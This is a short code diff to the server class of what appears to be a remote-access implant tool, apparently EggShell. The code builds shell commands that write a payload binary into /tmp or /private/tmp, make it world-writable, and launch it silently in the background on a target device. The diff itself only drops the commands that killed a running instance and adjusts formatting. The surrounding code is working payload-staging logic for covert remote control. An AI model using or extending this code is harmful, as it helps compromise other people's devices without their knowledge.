@@ -105,7 +105,6 @@ class Server:
             instructions = \
             "cat >/private/tmp/tmpespl;"+\
             "chmod 777 /private/tmp/tmpespl;"+\
-            "killall espl 2>/dev/null;"+\
             "mv /private/tmp/tmpespl /private/tmp/espl;"+\
             "/private/tmp/espl "+payload_parameter+" 2>/dev/null &\n"
             return (instructions,payload)
@@ -118,7 +117,6 @@ class Server:
             instructions = \
             "cat >/tmp/tmpespl;"+\
             "chmod 777 /tmp/tmpespl;"+\
-            "killall espl;"+\
             "mv /tmp/tmpespl /tmp/espl;"+\
             "/tmp/espl "+payload_parameter+" 2>/dev/null &\n"
             return (instructions,payload)
@@ -192,7 +190,7 @@ class Server:
         device_info.update({
             'type': device_type,
             'is_multi': is_multi,
-            })
+        })
         return session.Session(self,ssl_sock,device_info)
         
 
